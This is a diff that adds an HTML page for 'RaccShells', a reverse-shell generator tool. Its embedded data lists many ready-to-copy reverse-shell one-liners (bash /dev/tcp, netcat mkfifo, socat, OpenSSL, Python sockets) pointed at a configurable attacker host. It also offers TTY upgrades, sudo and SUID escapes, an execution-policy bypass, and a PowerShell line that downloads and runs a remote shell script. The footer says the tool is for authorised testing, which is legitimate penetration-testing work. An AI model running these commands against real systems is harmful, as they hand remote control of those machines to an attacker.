@@ -1,0 +1,2058 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RaccShells - Reverse Shell Generator</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Courier New', Consolas, 'Liberation Mono', monospace;
+      background-color: #0a0a0a;
+      color: #c0c0c0;
+      padding: 30px 20px;
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,0,0.012) 2px, rgba(0,255,0,0.012) 4px
+      );
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: auto;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* ── HEADER ── */
+    .header {
+      text-align: center;
+      margin-bottom: 28px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #1a3a1a;
+    }
+
+    .logo-img {
+      height: 160px;
+      width: auto;
+      display: block;
+      margin: 0 auto 12px;
+      filter: drop-shadow(0 0 14px rgba(0,255,0,0.4));
+    }
+
+    .tagline { color: #555; font-size: 0.82em; letter-spacing: 2px; }
+    .tagline strong { color: #00ff00; }
+
+    /* ── CONFIG PANEL ── */
+    .config-panel {
+      background: linear-gradient(180deg, #0d0d0d 0%, #111 100%);
+      border: 1px solid #1a3a1a;
+      border-radius: 6px;
+      padding: 20px;
+      margin-bottom: 16px;
+      box-shadow: 0 0 20px rgba(0,255,0,0.05);
+    }
+
+    .config-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr 1fr;
+      gap: 12px;
+      align-items: end;
+      margin-bottom: 14px;
+    }
+
+    @media (max-width: 768px) {
+      .config-grid { grid-template-columns: 1fr 1fr; }
+    }
+
+    .field label {
+      display: block;
+      font-size: 0.78em;
+      color: #666;
+      margin-bottom: 4px;
+      letter-spacing: 1px;
+    }
+
+    .prompt-green { color: #00ff00; }
+
+    input[type="text"], select {
+      width: 100%;
+      padding: 8px 10px;
+      background: #0a0a0a;
+      border: 1px solid #1a3a1a;
+      border-radius: 4px;
+      color: #c0ffc0;
+      font-family: inherit;
+      font-size: 0.92em;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    input[type="text"]:focus, select:focus {
+      border-color: #00cc00;
+      box-shadow: 0 0 6px rgba(0,255,0,0.2);
+    }
+
+    select option { background: #111; color: #c0ffc0; }
+
+    .listener-box {
+      background: #050f05;
+      border: 1px solid #0d2a0d;
+      border-radius: 4px;
+      padding: 10px 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .listener-label { color: #555; font-size: 0.78em; letter-spacing: 1px; white-space: nowrap; }
+    .listener-cmd { color: #00ff00; font-size: 0.88em; flex: 1; word-break: break-all; }
+
+    /* ── SEARCH ── */
+    .search-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+
+    .search-row input[type="text"] { flex: 1; }
+
+    /* ── TABS ── */
+    .tabs {
+      display: flex;
+      gap: 4px;
+      margin-bottom: 0;
+      flex-wrap: wrap;
+    }
+
+    .tab-btn {
+      background: #0d0d0d;
+      border: 1px solid #1a3a1a;
+      border-bottom: none;
+      border-radius: 4px 4px 0 0;
+      color: #555;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.82em;
+      letter-spacing: 1px;
+      padding: 7px 16px;
+      transition: color 0.2s, background 0.2s;
+    }
+
+    .tab-btn:hover { color: #aaa; }
+    .tab-btn.active { color: #00ff00; background: #0d1a0d; border-color: #1a5a1a; }
+
+    .tab-content {
+      display: none;
+      background: #0d1a0d;
+      border: 1px solid #1a5a1a;
+      border-radius: 0 4px 4px 4px;
+      padding: 14px;
+    }
+
+    .tab-content.active { display: block; }
+
+    /* ── SHELL LIST ── */
+    .shell-count { color: #444; font-size: 0.78em; letter-spacing: 1px; margin-bottom: 12px; }
+    .shell-count span { color: #00cc00; }
+
+    .shell-item {
+      background: #060f06;
+      border: 1px solid #1a3a1a;
+      border-radius: 4px;
+      margin-bottom: 8px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+
+    .shell-item:hover { border-color: #2a5a2a; }
+
+    .shell-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 12px;
+      cursor: pointer;
+      gap: 10px;
+    }
+
+    .shell-name {
+      color: #00cc00;
+      font-size: 0.88em;
+      font-weight: bold;
+      flex: 1;
+    }
+
+    .shell-badges { display: flex; gap: 4px; flex-wrap: wrap; }
+
+    .badge {
+      font-size: 0.68em;
+      padding: 2px 6px;
+      border-radius: 3px;
+      border: 1px solid;
+      letter-spacing: 0.5px;
+    }
+
+    .badge-linux  { color: #f0c060; border-color: #5a4a10; background: #1a1600; }
+    .badge-mac    { color: #60c0f0; border-color: #105a70; background: #001620; }
+    .badge-windows{ color: #a060f0; border-color: #4a1070; background: #140020; }
+    .badge-bind   { color: #f06060; border-color: #701010; background: #200000; }
+    .badge-msfvenom{ color: #f090a0; border-color: #602030; background: #180010; }
+
+    .copy-btn {
+      background: transparent;
+      border: 1px solid #1a4a1a;
+      border-radius: 3px;
+      color: #555;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.75em;
+      padding: 3px 10px;
+      transition: all 0.15s;
+      white-space: nowrap;
+    }
+
+    .copy-btn:hover { background: #0a2a0a; border-color: #00cc00; color: #00cc00; }
+    .copy-btn.copied { border-color: #00ff00; color: #00ff00; background: #001a00; }
+
+    .shell-body {
+      display: none;
+      padding: 0 12px 12px;
+    }
+
+    .shell-body.open { display: block; }
+
+    .shell-body pre {
+      background: #030803;
+      border: 1px solid #0d2a0d;
+      border-radius: 3px;
+      padding: 10px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    .shell-body code { color: #a0f0a0; font-size: 0.85em; }
+
+    /* ── LOTL TAB ── */
+    .lotl-os-filter {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-bottom: 16px;
+    }
+
+    .lotl-os-btn {
+      background: #0a0a0a;
+      border: 1px solid #1a3a1a;
+      border-radius: 20px;
+      color: #555;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.78em;
+      letter-spacing: 0.5px;
+      padding: 4px 14px;
+      transition: all 0.15s;
+    }
+
+    .lotl-os-btn:hover { border-color: #2a5a2a; color: #aaa; }
+    .lotl-os-btn.active { background: #0d1a0d; border-color: #1a5a1a; color: #00ff00; }
+
+    .lotl-section { margin-bottom: 20px; }
+
+    .lotl-section-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      padding-bottom: 6px;
+      border-bottom: 1px solid #1a3a1a;
+    }
+
+    .lotl-os-badge {
+      font-size: 0.72em;
+      padding: 2px 10px;
+      border-radius: 12px;
+      border: 1px solid;
+      font-family: inherit;
+      letter-spacing: 0.5px;
+    }
+
+    .lotl-os-badge.linux   { color: #f0c060; border-color: #5a4a10; background: #1a1600; }
+    .lotl-os-badge.mac     { color: #60c0f0; border-color: #105a70; background: #001620; }
+    .lotl-os-badge.windows { color: #a060f0; border-color: #4a1070; background: #140020; }
+
+    .lotl-section-title {
+      color: #00cc00;
+      font-size: 0.92em;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+
+    .lotl-item {
+      background: #060f06;
+      border: 1px solid #1a3a1a;
+      border-radius: 4px;
+      margin-bottom: 6px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+
+    .lotl-item:hover { border-color: #2a5a2a; }
+
+    .lotl-item-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 7px 12px;
+      cursor: pointer;
+      gap: 10px;
+    }
+
+    .lotl-item-label {
+      color: #888;
+      font-size: 0.82em;
+      flex: 1;
+    }
+
+    .lotl-item-body {
+      display: none;
+      padding: 0 12px 10px;
+    }
+
+    .lotl-item-body.open { display: block; }
+
+    .lotl-note {
+      color: #444;
+      font-size: 0.75em;
+      letter-spacing: 0.5px;
+      margin-top: 10px;
+      padding-top: 8px;
+      border-top: 1px solid #0d2a0d;
+      font-style: italic;
+    }
+
+    @media (max-width: 600px) {
+      .lotl-os-btn { font-size: 0.72em; padding: 3px 10px; }
+      .lotl-item-label { font-size: 0.78em; }
+    }
+
+    /* ── FILTER CHIPS ── */
+    .filter-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 8px;
+      margin-bottom: 14px;
+    }
+
+    .filter-chip {
+      background: #0a0a0a;
+      border: 1px solid #1a3a1a;
+      border-radius: 20px;
+      color: #555;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.72em;
+      letter-spacing: 0.5px;
+      padding: 3px 12px;
+      transition: all 0.15s;
+      user-select: none;
+    }
+
+    .filter-chip:hover { border-color: #2a5a2a; color: #aaa; }
+
+    .filter-chip.active-linux   { background: #1a1600; border-color: #5a4a10; color: #f0c060; }
+    .filter-chip.active-mac     { background: #001620; border-color: #105a70; color: #60c0f0; }
+    .filter-chip.active-windows { background: #140020; border-color: #4a1070; color: #a060f0; }
+    .filter-chip.active-enc     { background: #1a1200; border-color: #604a00; color: #e0c030;
+                                   text-shadow: 0 0 6px rgba(224,192,48,0.4); }
+    .filter-chip.active-obf     { background: #141a00; border-color: #667700; color: #ccdd00; }
+
+    @media (max-width: 600px) {
+      .filter-chip { font-size: 0.68em; padding: 3px 9px; }
+    }
+
+    /* ── OBFUSCATOR ── */
+    .obf-btn {
+      background: transparent;
+      border: 1px solid #2a2200;
+      border-radius: 3px;
+      color: #443300;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.72em;
+      padding: 3px 9px;
+      transition: all 0.15s;
+      white-space: nowrap;
+      letter-spacing: 0.5px;
+    }
+
+    .obf-btn:hover { border-color: #886600; color: #886600; }
+
+    .obf-btn.obf-on {
+      background: #1a1200;
+      border-color: #cc9900;
+      color: #e0b030;
+      text-shadow: 0 0 6px rgba(224,176,48,0.5);
+    }
+
+    .obf-mode-bar {
+      display: flex;
+      gap: 4px;
+      margin-bottom: 6px;
+      flex-wrap: wrap;
+    }
+
+    .obf-mode-chip {
+      background: #0a0a0a;
+      border: 1px solid #1a2a00;
+      border-radius: 12px;
+      color: #444;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.68em;
+      padding: 2px 8px;
+      transition: all 0.12s;
+    }
+
+    .obf-mode-chip:hover { border-color: #556600; color: #889900; }
+
+    .obf-mode-chip.active {
+      background: #141a00;
+      border-color: #889900;
+      color: #ccdd00;
+    }
+
+    /* ── SYNTAX HIGHLIGHTING ── */
+    .sh-cmd     { color: #00ff88; font-weight: bold; }
+    .sh-flag    { color: #79b8ff; }
+    .sh-string  { color: #f0a070; }
+    .sh-var     { color: #e0c060; }
+    .sh-ip      { color: #ff9966; }
+    .sh-num     { color: #b0a0ff; }
+    .sh-path    { color: #66ccaa; }
+    .sh-op      { color: #ff6680; }
+    .sh-comment { color: #444; font-style: italic; }
+
+    /* ── UPGRADE SECTION ── */
+    .upgrade-section h3 { color: #00cc00; font-size: 0.9em; letter-spacing: 1px; margin-bottom: 10px; margin-top: 16px; }
+    .upgrade-section h3:first-child { margin-top: 0; }
+    .upgrade-cmd {
+      background: #030803;
+      border: 1px solid #0d2a0d;
+      border-radius: 3px;
+      padding: 8px 12px;
+      margin-bottom: 6px;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .upgrade-cmd code { color: #a0f0a0; font-size: 0.83em; word-break: break-all; flex: 1; }
+    .upgrade-note { color: #555; font-size: 0.75em; margin-bottom: 12px; }
+
+    /* ── FOOTER ── */
+    .footer { text-align: center; margin-top: 20px; color: #222; font-size: 0.78em; letter-spacing: 2px; }
+    .footer a { color: #2a5a2a; text-decoration: none; }
+    .footer a:hover { color: #00cc00; }
+
+    /* ── TOAST ── */
+    #toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: #001a00; border: 1px solid #00cc00; border-radius: 4px;
+      color: #00ff00; font-size: 0.82em; letter-spacing: 1px;
+      padding: 8px 16px; opacity: 0; pointer-events: none;
+      transition: opacity 0.2s; z-index: 999;
+    }
+
+    #toast.show { opacity: 1; }
+
+    .no-results { color: #444; font-size: 0.85em; padding: 20px; text-align: center; }
+
+    /* ── DIAGRAM ── */
+    .shell-diagram {
+      margin-top: 10px;
+      border-top: 1px solid #0d2a0d;
+      padding-top: 10px;
+    }
+    .shell-diagram svg { width: 100%; height: auto; display: block; }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 600px) {
+      body { padding: 12px 10px; }
+
+      .logo-img { height: 56px; }
+
+      .tagline { font-size: 0.72em; letter-spacing: 1px; }
+
+      .config-grid { grid-template-columns: 1fr 1fr; gap: 8px; }
+
+      .listener-box {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 6px;
+      }
+
+      .search-row { flex-direction: column; gap: 6px; }
+
+      .tabs { gap: 2px; }
+      .tab-btn { font-size: 0.72em; padding: 6px 10px; letter-spacing: 0; }
+
+      .shell-header { padding: 8px 8px; gap: 6px; }
+      .shell-name { font-size: 0.82em; }
+      .shell-badges { gap: 3px; }
+      .badge { font-size: 0.62em; padding: 1px 4px; }
+
+      .copy-btn { font-size: 0.7em; padding: 3px 7px; }
+
+      .shell-body { padding: 0 8px 10px; }
+      .shell-body pre { font-size: 0.82em; }
+      .shell-body code { font-size: 0.82em; }
+
+      .upgrade-cmd { flex-direction: column; gap: 4px; }
+      .tool-cmd { flex-direction: column; gap: 4px; }
+      .tool-desc { padding-left: 0; padding-top: 2px; }
+
+      .setup-step { gap: 4px; }
+      .setup-cmd { flex-direction: column; gap: 4px; }
+
+      /* diagram: keep full width but taller on narrow screens */
+      .shell-diagram svg { min-height: 90px; }
+
+      #toast { bottom: 12px; right: 12px; left: 12px; right: 12px; text-align: center; }
+    }
+
+    @media (max-width: 400px) {
+      .config-grid { grid-template-columns: 1fr; }
+    }
+
+    /* ── SETUP GUIDE ── */
+    .setup-guide {
+      margin-top: 10px;
+      border-top: 1px solid #0d2a0d;
+      padding-top: 10px;
+    }
+
+    .setup-label {
+      color: #555;
+      font-size: 0.75em;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+
+    .setup-label span { color: #f0a030; }
+
+    .setup-step {
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+      margin-bottom: 5px;
+    }
+
+    .setup-step-num {
+      color: #f0a030;
+      font-size: 0.72em;
+      min-width: 18px;
+      padding-top: 2px;
+    }
+
+    .setup-step-inner { flex: 1; }
+
+    .setup-step-title {
+      color: #888;
+      font-size: 0.72em;
+      letter-spacing: 0.5px;
+      margin-bottom: 3px;
+    }
+
+    .setup-cmd {
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+    }
+
+    .setup-step pre {
+      flex: 1;
+      background: #020702;
+      border: 1px solid #0a1e0a;
+      border-radius: 3px;
+      padding: 6px 8px;
+      margin: 0;
+      overflow-x: auto;
+    }
+
+    .setup-step code { color: #d0a060; font-size: 0.82em; white-space: pre-wrap; }
+
+    /* ── TOOLS TAB ── */
+    .tool-card {
+      background: #060f06;
+      border: 1px solid #1a3a1a;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      overflow: hidden;
+    }
+
+    .tool-card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 14px;
+      cursor: pointer;
+      gap: 10px;
+    }
+
+    .tool-card-header:hover { background: #0a1a0a; }
+
+    .tool-name { color: #00cc00; font-size: 0.92em; font-weight: bold; }
+    .tool-desc { color: #555; font-size: 0.78em; flex: 1; padding-left: 12px; }
+
+    .tool-body { display: none; padding: 0 14px 14px; }
+    .tool-body.open { display: block; }
+
+    .tool-section-title {
+      color: #666;
+      font-size: 0.75em;
+      letter-spacing: 1px;
+      margin: 10px 0 4px;
+    }
+
+    .tool-cmd {
+      background: #030803;
+      border: 1px solid #0d2a0d;
+      border-radius: 3px;
+      padding: 8px 12px;
+      margin-bottom: 5px;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .tool-cmd code { color: #a0f0a0; font-size: 0.83em; flex: 1; white-space: pre-wrap; word-break: break-all; }
+    .tool-cmd-note { color: #d0a060; font-size: 0.83em; flex: 1; white-space: pre-wrap; word-break: break-all; }
+
+    .badge-tool      { color: #00cccc; border-color: #104040; background: #001414; }
+    .badge-dns       { color: #a0d060; border-color: #305010; background: #101800; }
+    .badge-ssl       { color: #60d0a0; border-color: #105030; background: #001810; }
+    .badge-smb       { color: #d06060; border-color: #501010; background: #180000; }
+    .badge-encrypted { color: #e0c030; border-color: #604a00; background: #1a1200;
+                       text-shadow: 0 0 6px rgba(224,192,48,0.4); }
+
+    .shell-item.encrypted {
+      border-color: #3a3010;
+    }
+    .shell-item.encrypted:hover { border-color: #5a4a18; }
+    .shell-item.encrypted .shell-header {
+      background: linear-gradient(90deg, #0d0d06 0%, #0a0a04 100%);
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <!-- HEADER -->
+  <div class="header">
+    <img src="static/raccshell_transparent.png" alt="RaccShells" class="logo-img">
+    <p class="tagline">REVERSE SHELLS. <strong>BIND SHELLS. PAYLOADS.</strong></p>
+  </div>
+
+  <!-- CONFIG PANEL -->
+  <div class="config-panel">
+    <div class="config-grid">
+      <div class="field">
+        <label><span class="prompt-green">&gt;</span> LHOST / IP</label>
+        <input type="text" id="ip" value="10.10.10.10" placeholder="10.0.0.1" oninput="render()" />
+      </div>
+      <div class="field">
+        <label><span class="prompt-green">&gt;</span> LPORT</label>
+        <input type="text" id="port" value="4444" placeholder="4444" oninput="render()" />
+      </div>
+      <div class="field">
+        <label><span class="prompt-green">&gt;</span> SHELL</label>
+        <select id="shell" onchange="render()">
+          <option value="/bin/bash">/bin/bash</option>
+          <option value="/bin/sh">/bin/sh</option>
+          <option value="/bin/zsh">/bin/zsh</option>
+          <option value="cmd.exe">cmd.exe</option>
+          <option value="powershell.exe">powershell.exe</option>
+        </select>
+      </div>
+      <div class="field">
+        <label><span class="prompt-green">&gt;</span> LISTENER</label>
+        <select id="listener" onchange="updateListener()">
+          <option value="nc">Netcat (nc)</option>
+          <option value="ncat">Ncat (ncat)</option>
+          <option value="socat">Socat</option>
+          <option value="rlwrap">rlwrap nc (TTY)</option>
+          <option value="msf">Metasploit handler</option>
+          <option value="pwncat_cs">pwncat-cs (calebstewart)</option>
+          <option value="pwncat_cy">pwncat (cytopia)</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="listener-box">
+      <span class="listener-label">&gt; LISTENER:</span>
+      <span class="listener-cmd" id="listener-cmd">nc -lvnp 4444</span>
+      <button class="copy-btn" onclick="copyText(document.getElementById('listener-cmd').textContent, this)">copy</button>
+    </div>
+  </div>
+
+  <!-- SEARCH -->
+  <div class="search-row">
+    <input type="text" id="search" placeholder="&#47; search shells..." oninput="render()" />
+  </div>
+  <div class="filter-row">
+    <span style="color:#333;font-size:0.72em;align-self:center;letter-spacing:1px">FILTER:</span>
+    <button class="filter-chip" data-filter="linux"   onclick="toggleFilter(this)">&#9670; linux</button>
+    <button class="filter-chip" data-filter="mac"     onclick="toggleFilter(this)">&#9670; mac</button>
+    <button class="filter-chip" data-filter="windows" onclick="toggleFilter(this)">&#9670; windows</button>
+    <button class="filter-chip" data-filter="enc"     onclick="toggleFilter(this)">&#128274; encrypted</button>
+    <button class="filter-chip" data-filter="obf"     onclick="toggleFilter(this)">&#9654; obfuscatable</button>
+  </div>
+
+  <!-- TABS -->
+  <div class="tabs">
+    <button class="tab-btn active" onclick="switchTab('reverse', this)">&#9658; Reverse Shells</button>
+    <button class="tab-btn" onclick="switchTab('bind', this)">&#9658; Bind Shells</button>
+    <button class="tab-btn" onclick="switchTab('msfvenom', this)">&#9658; MSFVenom</button>
+    <button class="tab-btn" onclick="switchTab('upgrade', this)">&#9658; Shell Upgrade</button>
+    <button class="tab-btn" onclick="switchTab('tools', this)">&#9658; Tools &amp; Listeners</button>
+    <button class="tab-btn" onclick="switchTab('lotl', this)">&#9658; Living off the Land</button>
+  </div>
+
+  <!-- TAB: REVERSE -->
+  <div class="tab-content active" id="tab-reverse">
+    <div class="shell-count">Showing <span id="count-reverse">0</span> reverse shells</div>
+    <div id="list-reverse"></div>
+  </div>
+
+  <!-- TAB: BIND -->
+  <div class="tab-content" id="tab-bind">
+    <div class="shell-count">Showing <span id="count-bind">0</span> bind shells</div>
+    <div id="list-bind"></div>
+  </div>
+
+  <!-- TAB: MSFVENOM -->
+  <div class="tab-content" id="tab-msfvenom">
+    <div class="shell-count">Showing <span id="count-msfvenom">0</span> msfvenom payloads</div>
+    <div id="list-msfvenom"></div>
+  </div>
+
+  <!-- TAB: UPGRADE -->
+  <div class="tab-content" id="tab-upgrade">
+    <div class="upgrade-section">
+      <h3>&#9658; Spawn TTY Shell</h3>
+      <div class="upgrade-cmd"><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>python -c 'import pty; pty.spawn("/bin/bash")'</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>/usr/bin/script -qc /bin/bash /dev/null</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>perl -e 'exec "/bin/bash";'</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>ruby -e 'exec "/bin/bash"'</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>lua -e 'os.execute("/bin/bash")'</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>echo os.system('/bin/bash')</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>/bin/sh -i</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+
+      <h3>&#9658; Fully Interactive TTY (stty)</h3>
+      <p class="upgrade-note">After spawning a TTY, background the shell (Ctrl-Z) and run these on your LOCAL machine:</p>
+      <div class="upgrade-cmd"><code>stty raw -echo; fg</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>stty size  # check your terminal size</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <p class="upgrade-note">Then on the REMOTE shell:</p>
+      <div class="upgrade-cmd"><code>export TERM=xterm-256color</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>stty rows 50 cols 200  # match your local stty size</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>reset</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+
+      <h3>&#9658; Socat Fully Interactive TTY</h3>
+      <p class="upgrade-note">Listener (attacker):</p>
+      <div class="upgrade-cmd"><code>socat file:`tty`,raw,echo=0 tcp-listen:4444</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <p class="upgrade-note">Target (if socat available):</p>
+      <div class="upgrade-cmd"><code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+
+      <h3>&#9658; Common Shell Escapes (sudo -l / SUID)</h3>
+      <div class="upgrade-cmd"><code>sudo /bin/bash</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>sudo -u root /bin/bash -p</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>find / -perm -4000 -type f 2>/dev/null</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+
+      <h3>&#9658; Windows Shell Upgrade</h3>
+      <div class="upgrade-cmd"><code>IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.10.10 4444</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+      <div class="upgrade-cmd"><code>powershell -ep bypass</code><button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button></div>
+    </div>
+  </div>
+
+  <!-- TAB: TOOLS -->
+  <div class="tab-content" id="tab-tools">
+    <div id="list-tools"></div>
+  </div>
+
+  <!-- TAB: LOTL -->
+  <div class="tab-content" id="tab-lotl">
+    <div class="lotl-os-filter">
+      <button class="lotl-os-btn active" data-os="all"     onclick="switchLotlOS(this)">&#9670; ALL</button>
+      <button class="lotl-os-btn"        data-os="windows" onclick="switchLotlOS(this)">&#9670; Windows</button>
+      <button class="lotl-os-btn"        data-os="linux"   onclick="switchLotlOS(this)">&#9670; Linux</button>
+      <button class="lotl-os-btn"        data-os="mac"     onclick="switchLotlOS(this)">&#9670; macOS</button>
+    </div>
+    <div id="list-lotl"></div>
+  </div>
+
+  <div class="footer">
+    <p>
+      <a href="https://github.com/BenjiTrapp" target="_blank">@BenjiTrapp</a> &nbsp;|&nbsp;
+      for authorised testing only
+    </p>
+  </div>
+</div>
+
+<div id="toast">copied to clipboard</div>
+
+<script>
+// ── DATA ──────────────────────────────────────────────────────────────────────
+
+const REVERSE = [
+  // ── BASH ──
+  { name:'Bash -i',        meta:['linux','mac'],     cmd:'{shell} -i >& /dev/tcp/{ip}/{port} 0>&1' },
+  { name:'Bash 196',       meta:['linux','mac'],     cmd:'0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196' },
+  { name:'Bash read line', meta:['linux','mac'],     cmd:'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done' },
+  { name:'Bash 5',         meta:['linux','mac'],     cmd:'{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5' },
+  { name:'Bash UDP',       meta:['linux','mac'],     cmd:'{shell} -i >& /dev/udp/{ip}/{port} 0>&1' },
+
+  // ── NETCAT ──
+  { name:'nc mkfifo',      meta:['linux','mac'],     cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f' },
+  { name:'nc -e',          meta:['linux','mac'],     cmd:'nc {ip} {port} -e {shell}' },
+  { name:'nc.exe -e',      meta:['windows'],         cmd:'nc.exe {ip} {port} -e {shell}' },
+  { name:'BusyBox nc',     meta:['linux'],           cmd:'busybox nc {ip} {port} -e {shell}' },
+  { name:'nc -c',          meta:['linux','mac'],     cmd:'nc -c {shell} {ip} {port}' },
+  { name:'ncat -e',        meta:['linux','mac'],     cmd:'ncat {ip} {port} -e {shell}' },
+  { name:'ncat.exe -e',    meta:['windows'],         cmd:'ncat.exe {ip} {port} -e {shell}' },
+  { name:'ncat UDP',       meta:['linux','mac'],     cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f' },
+
+  // ── CURL / SOCAT / TELNET ──
+  { name:'curl telnet',    meta:['linux','mac'],     cmd:"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null" },
+  { name:'socat',          meta:['linux','mac'],     cmd:'socat TCP:{ip}:{port} EXEC:{shell}' },
+  { name:'socat TTY',      meta:['linux','mac'],     cmd:"socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane" },
+  { name:'telnet mkfifo',  meta:['linux','mac'],     cmd:'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF' },
+  { name:'OpenSSL',        meta:['linux','mac'],     cmd:'mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s', encrypted:true },
+
+  // ── ZSH ──
+  { name:'zsh',            meta:['linux','mac'],     cmd:"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'" },
+
+  // ── PYTHON ──
+  { name:'Python3 #1',     meta:['linux','mac'],     cmd:'export RHOST="{ip}";export RPORT={port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")\'' },
+  { name:'Python3 #2',     meta:['linux','mac'],     cmd:"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'" },
+  { name:'Python3 short',  meta:['linux'],           cmd:"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'" },
